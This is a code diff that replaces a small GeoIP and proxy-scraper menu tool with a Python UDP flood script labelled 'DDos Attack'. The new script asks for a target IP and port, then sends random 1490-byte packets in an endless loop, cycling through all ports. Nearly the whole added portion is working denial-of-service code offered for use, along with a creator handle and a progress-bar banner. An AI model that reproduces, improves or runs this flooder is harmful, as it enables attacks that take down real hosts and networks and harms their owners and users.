@@ -1,76 +1,52 @@
-import os, requests, time, random, sys
-import pprint
+import sys
+import os
+import time
+import socket
+import random
+import colorama
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-def GeoIP():
-    ip_input = input('  IP> ')
-    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
-    response.json()
-    pprint.pprint(response.json())
-    time.sleep(10)
-    Main()
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Creator. : Spectate#4443"
+print "You Tube : "
+print "GitHub   : "
+print "TikTok :"
+print('\033[31m' + 'some red text')
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
-def scraper():
-    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
-    print(r.text)
-    p_type = input('  Type> ')
-    p_timeout = input('  Timeout> ')
-    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
-    with open('proxies.txt', 'w') as f:
-        f.write(r.text)
-        print('The proxies have been saved to \033[31m`proxies.txt`')
-        time.sleep(5)
-        Main()
-class Main():
-    def __init__(self):
-        self.gg = True
-        self.r = '\033[31m'
-        self.g = '\033[32m'
-        self.y = '\033[33m'
-        self.b = '\033[34m'
-        self.m = '\033[35m'
-        self.c = '\033[36m'
-        self.w = '\033[37m'
-        self.rr = '\033[39m'
-        self.cls()
-        self.start_logo()
-        self.options()
-        while self.gg == True:
-            choose = input(str('  @>  '))
-            if(choose == str(1)):
-                self.cls()
-                self.start_logo()
-                GeoIP()
-            elif(choose == str(2)):
-                self.cls()
-                self.start_logo()
-                scraper()
-
-
-    def cls(self):
-        linux = 'clear'
-        windows = 'cls'
-        os.system([linux, windows][os.name == 'nt'])
-
-    def start_logo(self):
-        clear = "\x1b[0m"
-        colors = [36, 32, 34, 35, 31, 37]
-
-        x = """
-        ████████╗███████╗███████╗████████╗
-        ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
-           ██║   █████╗  ███████╗   ██║   
-           ██║   ██╔══╝  ╚════██║   ██║   
-           ██║   ███████╗███████║   ██║   
-           ╚═╝   ╚══════╝╚══════╝   ╚═╝                                    
-        """
-
-        for N, line in enumerate(x.split("\n")):
-            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-            time.sleep(0.05)
-
-    def options(self):
-        print(self.y + '        [1] ' + self.c +'  GeoIP')
-        print(self.y + '        [2] ' + self.c + '  Proxy Scrape')
-
-Main()
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
